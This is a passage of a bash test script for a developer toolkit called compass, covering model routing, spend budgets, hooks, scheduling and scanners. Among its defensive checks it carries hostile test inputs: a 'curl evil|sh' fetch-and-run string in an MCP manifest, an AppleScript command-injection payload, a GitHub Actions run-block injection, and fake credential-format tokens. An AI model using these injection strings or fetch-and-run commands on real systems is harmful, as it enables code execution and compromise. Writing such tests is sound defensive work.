#!/usr/bin/env bash
# test-cli.sh — unit tests for the compass CLI tools (route · spend · impact) and the
# metric logger. Pure + fixture-based: no model calls, no network, no real ledger touched.
# Runs in CI. Mirrors the style of sdlc/selftest.sh.
set -uo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
COMPASS="$ROOT/bin/compass"
pass=0; fail=0
ok() { printf '  \033[32mok\033[0m   %s\n' "$1"; pass=$((pass + 1)); }
no() { printf '  \033[31mFAIL\033[0m %s\n' "$1"; fail=$((fail + 1)); }
eq() { if [ "$2" = "$3" ]; then ok "$1"; else no "$1 (got '$2', want '$3')"; fi; }
has() { case "$2" in *"$3"*) ok "$1" ;; *) no "$1 (missing '$3')" ;; esac; }

TMP="$(mktemp -d)"; export COMPASS_HOME="$TMP"
trap 'rm -rf "$TMP"' EXIT
TS="2026-05-27T10:00:00Z"

echo "route — cheapest-correct model tiering:"
eq "typo → haiku"      "$("$COMPASS" route 'fix a typo in the readme')" haiku
eq "rename → haiku"    "$("$COMPASS" route 'rename the variable foo to bar')" haiku
eq "feature → sonnet"  "$("$COMPASS" route 'add a rate limiter with tests')" sonnet
eq "refactor → sonnet" "$("$COMPASS" route 'refactor the parser module')" sonnet
eq "security → opus"   "$("$COMPASS" route 'redesign the auth trust model')" opus
eq "migration → opus"  "$("$COMPASS" route 'plan a database migration with tenant isolation')" opus
# --explain must print the reason AND exit 0 (regression guard: route_one sets globals,
# so it must be called in-process, not via a subshell that swallows REASON under set -u).
EX="$("$COMPASS" route --explain 'redesign the auth trust model' 2>&1)"; EXRC=$?
eq  "--explain exit 0"        "$EXRC" 0
has "--explain prints reason" "$EX" 'route: opus (matched opus keyword)'

echo "route --engine — opt-in advanced engine (router/route.sh):"
eq "advanced: typo → haiku"    "$("$COMPASS" route --engine advanced 'fix a typo in the readme')" haiku
eq "advanced: feature → sonnet" "$("$COMPASS" route --engine advanced 'add a rate limiter with tests')" sonnet
eq "advanced: security → opus"  "$("$COMPASS" route --engine advanced 'redesign the auth trust model')" opus
eq "env COMPASS_ROUTE_ENGINE=advanced works" "$(COMPASS_ROUTE_ENGINE=advanced "$COMPASS" route 'fix a typo in the readme')" haiku
if "$COMPASS" route --engine bogus 'fix a typo' >/dev/null 2>&1; then no "unknown engine should error"; else ok "unknown engine errors cleanly (exit 2)"; fi
eq "default (no --engine) still keyword" "$("$COMPASS" route 'fix a typo in the readme')" haiku

echo "route --score — cost-aware tier + confidence (deterministic floor preserved):"
has "opus high-stakes stays opus + high confidence" "$("$COMPASS" route --score 'redesign the auth trust model')" "opus	9"
has "haiku trivial + confidence"                    "$("$COMPASS" route --score 'fix typo')" "haiku	"
has "sonnet feature default"                        "$("$COMPASS" route --score 'add a rate limiter with tests')" "sonnet	70"
# budget bias only downgrades a WEAK sonnet pick to haiku — never opus.
eq  "vague short → low-confidence sonnet"            "$("$COMPASS" route --score 'update it' | cut -f1)" sonnet
eq  "budget-bias=low downgrades weak sonnet→haiku"   "$(COMPASS_ROUTE_BUDGET_BIAS=low "$COMPASS" route --score 'update it' | cut -f1)" haiku
eq  "budget-bias=low NEVER downgrades opus"          "$(COMPASS_ROUTE_BUDGET_BIAS=low "$COMPASS" route --score 'redesign the auth trust model' | cut -f1)" opus

echo "route — eval harness (scores the router vs the labeled set):"
if "$ROOT/scripts/compass-route.sh" --eval >/dev/null 2>&1; then ok "eval meets accuracy floor"; else no "eval below accuracy floor"; fi
# a deliberately tiny set passes; a floor of 101 must fail (proves the gate bites)
if COMPASS_ROUTE_MIN_ACCURACY=101 "$ROOT/scripts/compass-route.sh" --eval >/dev/null 2>&1; then no "floor=101 should fail"; else ok "accuracy floor actually gates"; fi

echo "spend — aggregation + budget:"
printf '%s\trepoA\tt\thaiku\t0.01\n%s\trepoA\tt\tsonnet\t0.04\n%s\trepoB\tt\topus\t0.30\n' "$TS" "$TS" "$TS" > "$TMP/spend.tsv"
J="$("$COMPASS" spend --all --json)"
has "total 0.35"   "$J" '"total":0.35'
has "haiku line"   "$J" '"haiku":0.01'
has "opus line"    "$J" '"opus":0.30'
has "no budget"    "$J" '"budget":null'
JB="$(COMPASS_BUDGET_USD=0.10 "$COMPASS" spend --all --json)"
has "budget set"   "$JB" '"budget":0.10'
EMPTY="$(COMPASS_HOME="$(mktemp -d)" "$COMPASS" spend --json)"
has "empty ledger" "$EMPTY" 'no spend logged yet'

echo "spend --max-usd — hard budget gate:"
# under-budget: total=0.35, cap=1.00 → exit 0, remaining reported
JU="$("$COMPASS" spend --all --json --max-usd 1.00)"; JURC=$?
eq  "under-budget exits 0"              "$JURC" 0
has "under-budget json has max_usd"     "$JU" '"max_usd":'
has "under-budget json over_budget=false" "$JU" '"over_budget":false'
has "under-budget json has remaining"   "$JU" '"remaining":'
# over-budget: total=0.35, cap=0.10 → exit 2, OVER_BUDGET in human output
JO="$("$COMPASS" spend --all --json --max-usd 0.10)"; JORC=$?
eq  "over-budget exits 2"              "$JORC" 2
has "over-budget json over_budget=true" "$JO" '"over_budget":true'
# env var: COMPASS_MAX_USD triggers the gate too
JOENV="$(COMPASS_MAX_USD=0.10 "$COMPASS" spend --all --json)"; JOENVRC=$?
eq  "COMPASS_MAX_USD env also gates"   "$JOENVRC" 2
has "COMPASS_MAX_USD json over_budget" "$JOENV" '"over_budget":true'
# flag wins over env: flag says 1.00 (under), env says 0.10 (over) → under wins
JFLAG="$(COMPASS_MAX_USD=0.10 "$COMPASS" spend --all --json --max-usd 1.00)"; JFLAGRC=$?
eq  "flag wins over env (under-budget)" "$JFLAGRC" 0
# human mode: over-budget prints OVER_BUDGET line, exits 2
HO="$("$COMPASS" spend --all --max-usd 0.10)"; HORC=$?
eq  "human over-budget exits 2"        "$HORC" 2
has "human output has OVER_BUDGET"     "$HO" 'OVER_BUDGET'
# human mode: under-budget shows remaining, exits 0
HU="$("$COMPASS" spend --all --max-usd 1.00)"; HURC=$?
eq  "human under-budget exits 0"       "$HURC" 0
has "human output has remaining"       "$HU" 'remaining'

echo "spend --today — per-day window (the unattended-loop circuit breaker):"
TODAY_D="$(date -u +%Y-%m-%d)"
printf '%sT09:00:00Z\trepoA\tt\tsonnet\t0.50\n2000-01-01T09:00:00Z\trepoA\tt\topus\t9.00\n' "$TODAY_D" > "$TMP/spend.tsv"
JT="$("$COMPASS" spend --today --json)"
has "today total counts only today's row" "$JT" '"total":0.5'
has "today window labelled"               "$JT" '"window":"today"'
JTG="$("$COMPASS" spend --today --json --max-usd 0.25)"; JTGRC=$?
eq  "today over per-day cap exits 2"       "$JTGRC" 2
has "today over_budget=true"              "$JTG" '"over_budget":true'

echo "impact — benefit dashboard:"
printf '%s\tblock\trepoA\tcatastrophic delete\n%s\tblock\trepoA\tprotected branch\n%s\tformat\trepoA\tgo\n' "$TS" "$TS" "$TS" > "$TMP/metrics.tsv"
I="$("$COMPASS" impact --json)"
has "2 blocked"    "$I" '"footguns_blocked":2'
has "1 formatted"  "$I" '"files_formatted":1'
has "savings est"  "$I" 'estimated_saved'

echo "dashboard — composes impact + fleet, degrades without gh:"
printf '%s\tblock\trepoA\trm\n%s\tformat\trepoA\tgo\n' "$TS" "$TS" > "$TMP/metrics.tsv"
DJ="$(COMPASS_HOME="$TMP" "$COMPASS" dashboard --json 2>/dev/null)"
has "json embeds impact"     "$DJ" '"impact":{'
has "json has fleet block"   "$DJ" '"fleet":{'
has "fleet open count"       "$DJ" '"open":0'
DH="$(COMPASS_HOME="$TMP" "$COMPASS" dashboard --html 2>/dev/null)"
has "html path printed"      "$DH" 'dashboard.html'
if [ -f "$TMP/dashboard.html" ]; then ok "html file written"; else no "dashboard.html not written"; fi
if COMPASS_HOME="$TMP" "$COMPASS" dashboard --no-fleet >/dev/null 2>&1; then ok "terminal panel exits 0 (no gh needed)"; else no "dashboard panel should exit 0"; fi
rm -f "$TMP/metrics.tsv" "$TMP/dashboard.html"

echo "metric logger (hook hot path):"
rm -f "$TMP/metrics.tsv"
( . "$ROOT/claude/hooks/lib/common.sh"; compass_log_metric block "a reason"; compass_log_metric format py )
eq "logged 2 rows" "$(wc -l < "$TMP/metrics.tsv" | tr -d ' ')" 2
has "tab-separated block row" "$(head -1 "$TMP/metrics.tsv")" "$(printf 'block')"

echo "compass-memory hooks — record (with redaction) + inject (opt-in, ADR 0001):"
if command -v python3 >/dev/null 2>&1 && command -v git >/dev/null 2>&1; then
  REPO_NAME="$(basename "$ROOT")"
  MEMDB="$TMP/mem.db"
  TR="$TMP/transcript.jsonl"
  printf '{"message":{"role":"assistant","content":[{"type":"text","text":"Done.\\nLEARNED: the suite needs CASS_SEED set or it flakes\\nMEMORY: api_key=sk-abc123def456ghi789jkl must be dropped"}]}}\n' > "$TR"
  # write path: only the safe LEARNED line should persist; the secret MEMORY line is scrubbed.
  REC="$(COMPASS_MEMORY_DB="$MEMDB" COMPASS_MEMORY_TRUST="$REPO_NAME:read-write" \
        printf '{"transcript_path":"%s"}' "$TR" | COMPASS_MEMORY_DB="$MEMDB" COMPASS_MEMORY_TRUST="$REPO_NAME:read-write" bash "$ROOT/claude/hooks/record-learning.sh" 2>/dev/null)"
  has "record hook confirms 1 learning" "$REC" "recorded 1 learning"
  ROWS="$(COMPASS_MEMORY_DB="$MEMDB" python3 "$ROOT/mcp/compass-memory/store.py" search "$REPO_NAME:read-write" --limit 9 2>/dev/null; COMPASS_MEMORY_DB="$MEMDB" COMPASS_MEMORY_TRUST="$REPO_NAME:read-write" python3 "$ROOT/mcp/compass-memory/store.py" search 'CASS_SEED' --json 2>/dev/null)"
  has "safe learning persisted"  "$ROWS" "CASS_SEED"
  case "$ROWS" in *sk-abc123*) no "secret learning leaked into the store" ;; *) ok "secret learning was scrubbed (not stored)" ;; esac
  # read path: SessionStart inject surfaces it as additionalContext.
  INJ="$(COMPASS_MEMORY_DB="$MEMDB" COMPASS_MEMORY_TRUST="$REPO_NAME:read-write" bash "$ROOT/claude/hooks/session-memory.sh" 2>/dev/null)"
  has "session inject emits SessionStart context" "$INJ" "SessionStart"
  has "session inject includes the learning"      "$INJ" "CASS_SEED"
  # disabled by default: no trust env → silent no-op.
  OFF="$(env -u COMPASS_MEMORY_TRUST bash "$ROOT/claude/hooks/session-memory.sh" 2>/dev/null; echo "rc=$?")"
  has "memory off by default (no trust → no-op)" "$OFF" "rc=0"
  case "$OFF" in *SessionStart*) no "memory should be silent when COMPASS_MEMORY_TRUST is unset" ;; *) ok "silent when unconfigured" ;; esac
  rm -f "$MEMDB"* "$TR"
else ok "python3/git absent — skipping memory hook tests"; fi

echo "require-tests — policy hook (nudge on source change with no test diff):"
if command -v git >/dev/null 2>&1; then
  G="$(mktemp -d)"
  (
    cd "$G" || exit 1
    git init -q; git config user.email t@t; git config user.name t
    echo "x" > base.txt; git add base.txt; git commit -qm base
    printf 'package main\nfunc Add(a,b int) int { return a+b }\n' > calc.go
    out_src="$(printf '{"tool_input":{"file_path":"%s/calc.go"}}' "$G" | "$ROOT/claude/hooks/require-tests.sh")"
    printf 'package main\nfunc TestAdd(t *testing.T){}\n' > calc_test.go
    out_test="$(printf '{"tool_input":{"file_path":"%s/calc.go"}}' "$G" | "$ROOT/claude/hooks/require-tests.sh")"
    printf '%s\n--SEP--\n%s' "$out_src" "$out_test"
  ) > "$TMP/rt.out"
  rt_src="$(sed '/--SEP--/,$d' "$TMP/rt.out")"
  rt_test="$(sed '1,/--SEP--/d' "$TMP/rt.out")"
  has "nudges on untested source" "$rt_src" "require-tests"
  if [ -z "$rt_test" ]; then ok "silent once a test file is dirty"; else no "should be silent when test touched (got '$rt_test')"; fi
  rm -rf "$G"
else no "git not available — cannot test require-tests hook"; fi

echo "statusline — compass activity + live \$-saved-today segment:"
TODAY="$(date -u +%Y-%m-%d)"
printf '%sT10:00:00Z\tblock\tr\trm\n%sT10:01:00Z\tformat\tr\tgo\n%sT10:02:00Z\tpolicy\tr\ttest-gap\n' "$TODAY" "$TODAY" "$TODAY" > "$TMP/metrics.tsv"
printf '%sT10:00:00Z\tr\tt\tsonnet\t0.20\n%sT10:01:00Z\tr\tt\thaiku\t0.05\n' "$TODAY" "$TODAY" > "$TMP/spend.tsv"
SL="$(printf '{"model":{"display_name":"Opus 4.8"},"workspace":{"current_dir":"%s"}}' "$ROOT" | bash "$ROOT/claude/statusline.sh")"
has "footgun + policy segments" "$SL" "🛡1"
has "format segment (middle column of the 3-way split)" "$SL" "🧹1"
has "policy nudge segment"      "$SL" "💡1"
has "live \$-saved today (.20*4 + .05*17 = 1.65)" "$SL" '$1.65'
# 📉 must be ABSENT when there's no spend ledger (guards the threshold/empty path).
SL2="$(printf '{"model":{"display_name":"x"},"workspace":{"current_dir":"%s"}}' "$ROOT" | COMPASS_HOME="$(mktemp -d)" bash "$ROOT/claude/statusline.sh")"
case "$SL2" in *📉*) no "📉 should be absent with no spend.tsv" ;; *) ok "no 📉 segment without spend data" ;; esac

echo "check-workflows — the gate actually bites:"
if bash "$ROOT/scripts/check-workflows.sh" >/dev/null 2>&1; then ok "shipped workflows pass"; else no "shipped workflows should pass"; fi
WF="$(mktemp -d)"
printf 'const x = 1\n' > "$WF/bad.js"                     # no meta, no orchestration
if bash "$ROOT/scripts/check-workflows.sh" "$WF" >/dev/null 2>&1; then no "malformed workflow should FAIL"; else ok "malformed workflow rejected"; fi
printf "export const meta = { name: 'mismatch', description: 'x' }\nawait agent('hi')\n" > "$WF/named.js"
if bash "$ROOT/scripts/check-workflows.sh" "$WF" >/dev/null 2>&1; then no "name!=filename should FAIL"; else ok "name/filename mismatch rejected"; fi
rm -rf "$WF"

echo "sbom — ecosystem detection + graceful degrade:"
SF="$(mktemp -d)"
( cd "$SF" && printf '{"dependencies":{"left-pad":"^1.0.0"}}' > package.json && bash "$ROOT/scripts/compass-sbom.sh" --no-audit --json ) > "$SF/out.json" 2>/dev/null
has "detects node ecosystem"   "$(cat "$SF/out.json")" '"ecosystem":"node"'
has "counts dependencies"      "$(cat "$SF/out.json")" '"dependencies":1'
NOECO="$( ( cd "$SF" && rm -f package.json && bash "$ROOT/scripts/compass-sbom.sh" --no-audit --json ) 2>/dev/null )"
has "no ecosystem → graceful"  "$NOECO" '"ecosystem":"none"'
if ( cd "$SF" && bash "$ROOT/scripts/compass-sbom.sh" --no-audit >/dev/null 2>&1 ); then ok "sbom exits 0 with nothing to scan"; else no "sbom should exit 0 when no ecosystem"; fi
rm -rf "$SF"

echo "policy-synth — fleet brain proposes rules from recurring findings (never applies):"
PS="$(printf 'Blocking: missing error handling\nunchecked error in writer\nshould add a test for the failure path\nno test for this branch\n' | "$COMPASS" policy-synth --min 2 - 2>/dev/null)"
has "proposes a rule above threshold" "$PS" "Consider adding to CLAUDE.md"
has "error-handling theme detected"   "$PS" "error-handling"
PSQ="$(printf 'unchecked error\nmissing error handling\n' | "$COMPASS" policy-synth --min 2 --json - 2>/dev/null)"
has "json proposals array"            "$PSQ" '"proposals":[{'
NONE="$(printf 'just a nit about naming\n' | "$COMPASS" policy-synth --min 3 - 2>/dev/null)"
has "nothing proposed when nothing recurs" "$NONE" "Nothing to propose"

echo "bench — reproducible scorecard meets its floors:"
BJ="$("$COMPASS" bench --json 2>/dev/null)"
has "guardrail precision 100"  "$BJ" '"precision":100'
has "guardrail recall 100"     "$BJ" '"recall":100'
has "router accuracy reported" "$BJ" '"router":{"accuracy":'
if "$COMPASS" bench >/dev/null 2>&1; then ok "bench passes its gate (exit 0)"; else no "bench should pass its floors"; fi
# prove the gate bites: an impossible recall floor must fail.
if COMPASS_BENCH_RECALL_FLOOR=101 "$COMPASS" bench --guardrail >/dev/null 2>&1; then no "recall floor=101 should fail"; else ok "bench floor actually gates"; fi

echo "check-actions — drift + injection gates bite:"
if bash "$ROOT/scripts/check-actions.sh" >/dev/null 2>&1; then ok "repo workflows pass the actions audit"; else no "repo workflows should pass the actions audit"; fi
AF="$(mktemp -d)"
printf 'name: bad\non: [pull_request]\njobs:\n  x:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo "${{ github.event.issue.body }}"\n' > "$AF/bad.yml"
if bash "$ROOT/scripts/check-actions.sh" --lint "$AF/bad.yml" >/dev/null 2>&1; then no "run-block injection + missing-permissions should FAIL"; else ok "injection / missing-permissions rejected"; fi
rm -rf "$AF"

echo "quickstart — non-interactive dry-run is side-effect-free:"
QS="$("$ROOT/quickstart.sh" --dry-run --yes 2>&1)"; QSRC=$?
eq  "quickstart --dry-run --yes exit 0" "$QSRC" 0
has "quickstart reaches the on-ramp"    "$QS" "next 60 seconds"

echo "notify.sh — no command injection via untrusted notification text:"
rm -f "$TMP/pwned"
printf '{"hook_event_name":"Notification","cwd":"%s","message":"%s"}' "$ROOT" 'x\" ) \ndo shell script \"touch '"$TMP"'/pwned\" \n--' | bash "$ROOT/claude/hooks/notify.sh"; NRC=$?
eq  "notify exits 0 on hostile input" "$NRC" 0
if [ -f "$TMP/pwned" ]; then no "notify.sh executed injected payload"; else ok "no injection executed"; fi
if grep -q 'osascript /dev/stdin' "$ROOT/claude/hooks/notify.sh"; then ok "uses osascript argv form"; else no "notify.sh regressed to -e string interpolation"; fi

echo "notify — channel-agnostic backends (dry-run + graceful no-op):"
LAN="$(COMPASS_NOTIFY_URL='http://127.0.0.1:3100,http://127.0.0.1:3200' COMPASS_NOTIFY_TOKEN=tok "$COMPASS" notify --dry-run 'PR #1 green' 2>&1)"
has "bridge dry-run hits both endpoints" "$LAN" '/session/00000000-0000-0000-0000-000000000001/send-self'
has "bridge encodes message"           "$LAN" '"message":"PR #1 green"'
SLK="$(COMPASS_NOTIFY_SLACK='https://hooks.slack.test/x' COMPASS_NOTIFY_TELEGRAM_TOKEN=t COMPASS_NOTIFY_TELEGRAM_CHAT=99 "$COMPASS" notify --dry-run 'hi' 2>&1)"
has "slack backend (no bridge needed)" "$SLK" 'slack: POST https://hooks.slack.test/x'
has "telegram backend"                  "$SLK" 'api.telegram.org/bott/sendMessage'
CLEANENV() { env -u COMPASS_NOTIFY_URL -u COMPASS_NOTIFY_SLACK -u COMPASS_NOTIFY_DISCORD -u COMPASS_NOTIFY_WEBHOOK -u COMPASS_NOTIFY_NTFY -u COMPASS_NOTIFY_TELEGRAM_TOKEN "$@"; }
if CLEANENV "$COMPASS" notify 'hi' >/dev/null 2>&1; then ok "no backend = graceful no-op (exit 0)"; else no "unconfigured notify should exit 0"; fi
if CLEANENV "$COMPASS" notify --require 'hi' >/dev/null 2>&1; then no "--require should fail when unconfigured"; else ok "--require errors when unconfigured"; fi

echo "compass listen — command parser (pure plan(), no gh/network):"
if command -v node >/dev/null 2>&1; then
  if node "$ROOT/scripts/test-listen.mjs" >/dev/null 2>&1; then ok "listener command parser (11 cases)"; else no "listener parser test failed (run: node scripts/test-listen.mjs)"; fi
else ok "node absent — skipping listener parser test"; fi

echo "compass-schedule — unattended cron run is bounded:"
if grep -q -- '--max-turns' "$ROOT/scripts/compass-schedule.sh" && grep -q -- '--max-budget-usd' "$ROOT/scripts/compass-schedule.sh"; then
  ok "cron claude -p has turn + budget caps"; else no "cron claude -p is missing turn/budget caps"; fi

echo "compass enable — one-command multi-repo onboarding:"
EN="$ROOT/scripts/compass-enable.sh"
[ -x "$EN" ] && ok "enable script exists + executable" || no "enable script missing/not executable"
"$EN" --help >/dev/null 2>&1 && ok "--help exits 0" || no "--help failed"
"$EN" --bogus-flag x >/dev/null 2>&1; [ $? -eq 2 ] && ok "unknown flag exits 2" || no "unknown flag not rejected"
"$EN" >/dev/null 2>&1; [ $? -eq 2 ] && ok "no targets exits 2" || no "no-target case not rejected"
ETMP="$(mktemp -d "${TMPDIR:-/tmp}/compass-enable.XXXXXX")"
git init -q "$ETMP/fake-repo"
EOUT="$("$EN" --dry-run --schedule --coverage 70 "$ETMP/fake-repo" 2>&1)"; ERC=$?
eq  "dry-run exits 0"                    "$ERC" 0
has "dry-run prints the layered plan"    "$EOUT" "L1 new-repo.sh"
has "dry-run includes schedule step"     "$EOUT" "pr-shepherd twice daily"
has "dry-run includes coverage step"     "$EOUT" "coverage≥70"
[ -z "$(git -C "$ETMP/fake-repo" status --porcelain)" ] && ok "dry-run changed nothing" || no "dry-run mutated the repo"
# owner/repo slug path (the clone branch) must resolve in dry-run — caught a live
# bash-3.2 `local` expansion bug the dir path never exercises.
SOUT="$("$EN" --dry-run --clone-root "$ETMP/clones" owner/some-repo 2>&1)"; SRC=$?
eq  "slug dry-run exits 0"        "$SRC" 0
has "slug target resolves"        "$SOUT" "enable:"
rm -rf "$ETMP"
grep -q "env-only" "$EN" && grep -q "never prompts" "$EN" \
  && ok "secrets are env-only by contract (no prompting, no credential-store reads)" \
  || no "env-only secrets contract missing"
# secret VALUES must go via stdin — a --body arg is visible to every process (ps).
if grep -E 'gh secret set' "$EN" | grep -q -- '--body'; then
  no "gh secret set uses --body (secret leaks to the process list)"
else ok "secret values flow via stdin, never argv"; fi

echo "compass-schedule — pr-shepherd routine wiring:"
if grep -q 'VALID_ROUTINES=.*pr-shepherd' "$ROOT/scripts/compass-schedule.sh"; then
  ok "pr-shepherd is a valid routine"; else no "pr-shepherd missing from VALID_ROUTINES"; fi
[ -f "$ROOT/sdlc/routines/prompts/pr-shepherd.md" ] && ok "pr-shepherd prompt exists" || no "pr-shepherd prompt missing"
# every safety rail the prompt promises must actually be in the prompt
for rail in "Never force-push" "Never merge red" "THREE STRIKES" "READ-ONLY" "no test, no push" "NEVER MERGE" "same-repo PRs only"; do
  if grep -q "$rail" "$ROOT/sdlc/routines/prompts/pr-shepherd.md"; then
    ok "prompt rail present: $rail"; else no "prompt rail missing: $rail"; fi
done
if grep -q 'PR_SHEPHERD_EXTRA_TOOLS=' "$ROOT/scripts/compass-schedule.sh" \
   && grep -q 'gh pr merge --squash:' "$ROOT/scripts/compass-schedule.sh"; then
  ok "shepherd toolset grants squash-merge (and only squash)"; else no "shepherd toolset missing/over-broad"; fi
# The composed toolset must strip gh api — with merge authority it's an escape hatch to
# the merge/ref REST endpoints. Evaluate the ACTUAL composition, not the source text.
shep_tools="$(bash -c '
  source /dev/null
  eval "$(grep -E "^(ALLOWED_TOOLS|CI_WATCH_EXTRA_TOOLS|PR_SHEPHERD_EXTRA_TOOLS)=" "'"$ROOT"'/scripts/compass-schedule.sh")"
  printf "%s" "${ALLOWED_TOOLS/,Bash(gh api:*)/}${PR_SHEPHERD_EXTRA_TOOLS}"
')"
case "$shep_tools" in
  *"gh api"*) no "shepherd composed toolset still contains gh api (merge escape hatch)" ;;
  *"gh pr merge --squash"*) ok "shepherd composed toolset: squash-only, no gh api" ;;
  *) no "shepherd composed toolset lost the squash-merge grant" ;;
esac
# The prompt's merge command must be the exact allowlisted prefix form (prefix matching:
# 'gh pr merge <n> --squash' would be DENIED by 'gh pr merge --squash:*').
if grep -q 'gh pr merge --squash <n>' "$ROOT/sdlc/routines/prompts/pr-shepherd.md"; then
  ok "prompt uses the allowlisted flags-first merge form"; else no "prompt merge form won't match the allowlist prefix"; fi
if grep -q -- '--twice-daily' "$ROOT/scripts/compass-schedule.sh"; then
  ok "--twice-daily cadence flag exists"; else no "--twice-daily flag missing"; fi

echo "compass-schedule — per-repo scheduling (--dir) + dry-run backends:"
SCHED="$ROOT/scripts/compass-schedule.sh"
SD1="$(cd "$(mktemp -d)" && pwd)"; SD2="$(cd "$(mktemp -d)" && pwd)"
# pure generator: entry cds into --dir and the trailing comment key carries the dir
SENT="$(bash -c '. "$1" && make_entry "0 6 * * *" pr-babysit "$2"' _ "$SCHED" "$SD1")"
has "entry cds into --dir"          "$SENT" "cd \"$SD1\""
has "entry comment key carries dir" "$SENT" "# compass:pr-babysit:$SD1"
has "entry passes dir to run"       "$SENT" "schedule run \"pr-babysit\" \"$SD1\""
# end-to-end under COMPASS_SCHEDULE_DRYRUN (--cron forces the crontab backend on every OS)
COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" add pr-babysit --cron "0 6 * * *" --dir "$SD1" >/dev/null 2>&1
COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" add pr-babysit --cron "0 7 * * *" --dir "$SD2" >/dev/null 2>&1
SL1="$(COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" list)"
has "--dir persisted in entry text"      "$SL1" "cd \"$SD1\""
has "same routine, two dirs coexist (1)" "$SL1" "# compass:pr-babysit:$SD1"
has "same routine, two dirs coexist (2)" "$SL1" "# compass:pr-babysit:$SD2"
COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" remove pr-babysit --dir "$SD1" >/dev/null
SL2="$(COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" list)"
case "$SL2" in *"compass:pr-babysit:$SD1"*) no "remove --dir should remove only that dir's entry" ;; *) ok "remove --dir removes only that dir" ;; esac
has "the other dir's entry survives" "$SL2" "# compass:pr-babysit:$SD2"
RALL="$(COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" remove pr-babysit)"
has "remove without --dir notes it removed all" "$RALL" "removed ALL entries"
# darwin: launchd plist generation (dry-run — nothing is bootstrapped or installed)
if [ "$(uname)" = "Darwin" ] && command -v plutil >/dev/null 2>&1; then
  SADD="$(COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" add pr-babysit --daily --dir "$SD1")"
  has "darwin add says launchd catches up on wake" "$SADD" "once on wake"
  PL="$(ls "$TMP"/dryrun-launchagents/com.compass.schedule.pr-babysit.*.plist 2>/dev/null | head -1)"
  if [ -n "$PL" ] && plutil -lint "$PL" >/dev/null 2>&1; then ok "generated launchd plist is valid (plutil -lint)"; else no "launchd plist missing or invalid"; fi
  has "plist cds into --dir"           "$(cat "$PL" 2>/dev/null)" "cd \"$SD1\""
  has "list shows launchd entry + dir" "$(COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" list)" "com.compass.schedule.pr-babysit"
  COMPASS_SCHEDULE_DRYRUN=1 bash "$SCHED" remove pr-babysit --dir "$SD1" >/dev/null
  if [ -f "$PL" ]; then no "remove --dir left the plist behind"; else ok "remove --dir deletes the plist"; fi
else ok "non-darwin (or no plutil) — skipping launchd plist tests"; fi
rm -rf "$SD1" "$SD2" "$TMP/dryrun-crontab" "$TMP/dryrun-launchagents"

echo "new-repo — a dangling AGENTS.md symlink does not abort (set -e):"
if command -v git >/dev/null 2>&1; then
  NR="$(mktemp -d)"
  ( cd "$NR" && git init -q && : > CLAUDE.md && ln -s CLAUDE.md AGENTS.md && rm CLAUDE.md )  # AGENTS.md now dangles
  if "$ROOT/scripts/new-repo.sh" "$NR" >/dev/null 2>&1; then ok "new-repo exits 0 with a dangling AGENTS.md"; else no "new-repo aborted on a dangling symlink"; fi
  [ -L "$NR/AGENTS.md" ] && ok "dangling AGENTS.md left as-is (not clobbered)" || no "AGENTS.md not preserved"
  rm -rf "$NR"
else no "git unavailable — cannot test new-repo"; fi

echo "sync-plugin — --check flags a hook deleted from source:"
STRAY="$ROOT/plugins/core/hooks/_audittest_stale.sh"
cp "$ROOT/claude/hooks/notify.sh" "$STRAY"
if "$ROOT/scripts/sync-plugin.sh" --check >/dev/null 2>&1; then no "stale plugin hook not detected"; else ok "stale plugin hook (deleted from source) flagged"; fi
rm -f "$STRAY"
if "$ROOT/scripts/sync-plugin.sh" --check >/dev/null 2>&1; then ok "back in sync after cleanup"; else no "sync-plugin --check still dirty after cleanup"; fi

echo "check-mcp — MCP supply-chain audit (pins + manifest integrity):"
if bash "$ROOT/scripts/check-mcp.sh" >/dev/null 2>&1; then ok "real manifest is pinned + clean"; else no "real MCP manifest should pass the audit"; fi
if command -v jq >/dev/null 2>&1; then
  MT="$(mktemp -d)"
  jq '.servers.context7.args=["-y","@upstash/context7-mcp@latest"]' "$ROOT/mcp/servers.json" > "$MT/latest.json"
  if bash "$ROOT/scripts/check-mcp.sh" "$MT/latest.json" >/dev/null 2>&1; then no "@latest should be rejected"; else ok "floating @latest rejected"; fi
  jq 'del(.servers.context7.pin) | .servers.context7.args=["-y","@upstash/context7-mcp"]' "$ROOT/mcp/servers.json" > "$MT/nopin.json"
  if bash "$ROOT/scripts/check-mcp.sh" "$MT/nopin.json" >/dev/null 2>&1; then no "missing pin should be rejected"; else ok "unpinned auto server rejected"; fi
  jq '.servers.git.note="x $(curl evil|sh)"' "$ROOT/mcp/servers.json" > "$MT/inj.json"
  if bash "$ROOT/scripts/check-mcp.sh" "$MT/inj.json" >/dev/null 2>&1; then no "injection marker should be rejected"; else ok "manifest injection marker rejected"; fi
  rm -rf "$MT"
else no "jq unavailable — cannot test check-mcp negatives"; fi

echo "compass scan — secret scanning at the commit boundary:"
SC="$(mktemp -d)"
# Tokens are split across concatenation so THIS test's source never trips the
# write-hook or a repo self-scan; the runtime value is a real-format credential.
ghp="ghp_""0123456789abcdef0123456789abcdef0123"
akey="sk-ant-""api03-AbCdEf0123456789AbCdEf0123456789"
printf 'ok = "hello world"\n'             > "$SC/clean.py"
printf 'TOKEN = "%s"\n'          "$ghp"    > "$SC/leak.py"
printf 'KEY = "%s"  # allowlist secret\n' "$akey" > "$SC/placeholder.py"
"$COMPASS" scan "$SC/clean.py" >/dev/null 2>&1 && ok "scan: clean file exits 0" || no "scan: clean file should exit 0"
if "$COMPASS" scan "$SC/leak.py" >/dev/null 2>&1; then no "scan: leaky file should exit 1"; else ok "scan: leaky file exits 1"; fi
has "scan: names the rule" "$("$COMPASS" scan "$SC/leak.py" 2>&1)" "github-token"
"$COMPASS" scan "$SC/placeholder.py" >/dev/null 2>&1 && ok "scan: 'allowlist secret' marker exempts the line" || no "scan: allowlist marker should exempt"
if command -v git >/dev/null 2>&1; then
  SG="$(mktemp -d)"; git -C "$SG" init -q >/dev/null 2>&1
